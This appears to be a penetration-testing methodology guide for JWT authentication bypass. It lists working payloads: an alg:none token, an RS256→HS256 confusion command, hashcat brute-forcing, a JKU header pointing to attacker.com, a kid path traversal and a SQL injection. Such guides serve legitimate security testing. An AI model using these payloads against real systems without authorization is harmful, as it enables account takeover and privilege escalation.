# Scenario: JWT Authentication Bypass Workflow

## Objective
Test JWT-based authentication for misconfigurations that allow token forgery, algorithm confusion, or privilege escalation.

---

## Phase 1: Reconnaissance

### Step 1: Identify JWT usage
Look for JWTs in:
- `Authorization: Bearer eyJ...` header
- Cookies (`token=eyJ...`, `access_token=eyJ...`)
- URL parameters
- Local storage (visible in browser DevTools → Application)

JWT structure: `header.payload.signature` (base64url-encoded, dot-separated).

### Step 2: Decode the JWT
```bash
# Decode without verification
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d

# Or use jwt.io, jwt_tool, or Burp's JWT Editor extension
python3 jwt_tool.py JWT_TOKEN_HERE
```

Record the header and payload:
```json
// Header
{"alg": "HS256", "typ": "JWT"}

// Payload
{"sub": "user123", "role": "user", "exp": 1700000000}
```

---

## Phase 2: Algorithm Attacks

### Step 3: Algorithm: none
Remove the signature and set algorithm to `none`:
```json
{"alg": "none", "typ": "JWT"}
```
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.PAYLOAD.
```
Send without a signature (empty third part). If accepted → **critical bypass**.

Try variations: `None`, `NONE`, `nOnE`, `"alg":"none"`.

### Step 4: RS256 → HS256 confusion
If the server uses RS256 (asymmetric), try switching to HS256 (symmetric):
1. Obtain the server's **public key** (from `/jwks.json`, `/.well-known/jwks.json`, or SSL certificate).
2. Change the header to `{"alg": "HS256"}`.
3. Sign the token using the **public key as the HMAC secret**.

```bash
python3 jwt_tool.py TOKEN -S hs256 -k public_key.pem
```

If the server uses the public key to verify HS256 → **authentication bypass**.

---

## Phase 3: Key Attacks

### Step 5: Weak secret brute force
If HS256, brute-force the signing key:
```bash
# Using jwt_tool
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Using hashcat
hashcat -a 0 -m 16500 JWT_TOKEN /usr/share/wordlists/rockyou.txt
```

Common weak secrets: `secret`, `password`, `key`, `123456`, application name.

### Step 6: JWK header injection
Embed your own key in the JWT header:
```json
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "n": "YOUR_PUBLIC_KEY_N",
    "e": "AQAB"
  }
}
```
Sign with your private key. If the server trusts the embedded JWK → **key injection bypass**.

### Step 7: JKU (JWK Set URL) injection
```json
{
  "alg": "RS256",
  "jku": "https://attacker.com/.well-known/jwks.json"
}
```
Host your own JWKS at the attacker URL. If the server fetches keys from the JKU → bypass.

### Step 8: Kid (Key ID) injection
```json
{
  "alg": "HS256",
  "kid": "../../dev/null"
}
```
If `kid` is used to read a file as the signing key, pointing to `/dev/null` (empty file) means:
- The secret key = empty string
- Sign with an empty key → key bypass

SQL injection via kid:
```json
{"kid": "' UNION SELECT 'secret-key' -- "}
```

---

## Phase 4: Payload Manipulation

### Step 9: Role/privilege escalation
Modify the payload claims:
```json
// Original
{"sub": "user123", "role": "user"}

// Modified
{"sub": "user123", "role": "admin"}
{"sub": "admin", "role": "admin"}
{"sub": "user123", "is_admin": true}
```

Re-sign with the cracked/bypassed key and send.

### Step 10: Expiration bypass
```json
// Set expiration far in the future
{"exp": 9999999999}

// Or remove exp claim entirely
```

### Step 11: Subject manipulation (IDOR via JWT)
```json
// Original: your user
{"sub": "100"}

// Modified: another user
{"sub": "1"}  → Admin?
{"sub": "101"} → Another user?
```

---

## Phase 5: Token Lifecycle Testing

### Step 12: Token reuse after logout
1. Log in → capture JWT.
2. Log out.
3. Reuse the JWT → is it still valid? → **no server-side invalidation**.

### Step 13: Token reuse after password change
1. Log in → capture JWT.
2. Change password.
3. Reuse the old JWT → still valid? → **session not revoked**.

### Step 14: Refresh token abuse
If refresh tokens are issued:
- Can you reuse a refresh token after it's been used?
- Can you use a refresh token from one user for another?
- Does the refresh token have an expiration?

---

## Decision Tree

```
JWT found
  ├── Decode → Check algorithm
  │     ├── HS256 → Try brute-force weak secret
  │     ├── RS256 → Try RS256→HS256 confusion
  │     └── Any → Try alg:none
  ├── Check for kid → File traversal / SQLi injection
  ├── Check for jku/jwk → Key injection via URL/embedded key
  ├── Modify payload claims → Role escalation, subject swap
  ├── Test token lifecycle → Logout, password change, refresh reuse
  └── All signed correctly → Try expired token, missing claims
```

## Tools
- `jwt_tool` — Comprehensive JWT testing tool
- `Burp JWT Editor` extension — Visual JWT manipulation
- `hashcat -m 16500` — JWT secret brute-force
- `jwt.io` — Quick decode and verify

## References
- `techniques/jwt-attacks-and-misconfigurations.md`
- `web-vulnerabilities/auth-and-session-issues.md`
- `methodology/exploitation-methodology.md`
